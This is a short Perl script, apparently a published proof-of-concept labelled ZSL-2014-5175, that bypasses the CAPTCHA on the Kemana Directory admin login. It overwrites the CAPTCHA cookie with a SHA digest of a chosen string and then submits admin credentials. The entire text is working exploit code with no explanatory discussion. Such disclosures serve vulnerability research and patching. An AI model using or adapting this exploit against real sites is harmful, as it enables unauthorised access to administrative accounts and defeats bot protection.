use LWP::UserAgent;use HTTP::Cookies;use HTTP::Request::Common;use Digest::SHA;info();#2014-03
$url="http://localhost/kemana/admin/login.php";$domain="localhost.local";$juzer="admin";$pass=
"admin";$cookie_jar=HTTP::Cookies->new();$ua=LWP::UserAgent->new;$ua->cookie_jar($cookie_jar);
print" [*] Sending request.\n";sleep(1);$request=GET $url;$response=$ua->request($request);#$_
print" [*] Reading cookie from Response Headers.\n";$cookie_jar->extract_cookies($response);#1
print" [*] ".$cookie_jar->as_string();sleep(1);$kuki=$cookie_jar->as_string;($regexp)=$kuki#].
=~/qvc_value=(.*?);/;print" [*] Got CAPTCHA: ".$regexp."\n";$sha=Digest::SHA->new();$data=#(";
"joxypoxy";$sha->add($data);$digest=$sha->hexdigest;print" [*] Poisoning with: ".$digest."\n";
$cookie_jar->set_cookie(0,'qvc_value',$digest,'/',$domain);print" [*] ".$cookie_jar->as_string
;sleep(1);print" [*] Sending login credentials.\n";$postche=$ua->request(POST $url,[user_id=>$
juzer,user_passwd=>$pass,visual=>$data]);print"\n";$check=$postche->as_string;if($check=~#get;
"HTTP/1.1 302 Found"){print" [*] CAPTCHA bypassed!\n";}else{print" [!] Didn\'t work.\n";}sub#\
info(){print"
 +-----------------------------------------------------+
 |                                                     |
 |     Kemana Directory CAPTCHA Bypass PoC Exploit     |
 |                                                     |
 |                  ID: ZSL-2014-5175                  |
 |                                                     |
 +-----------------------------------------------------+
 \n\n";}
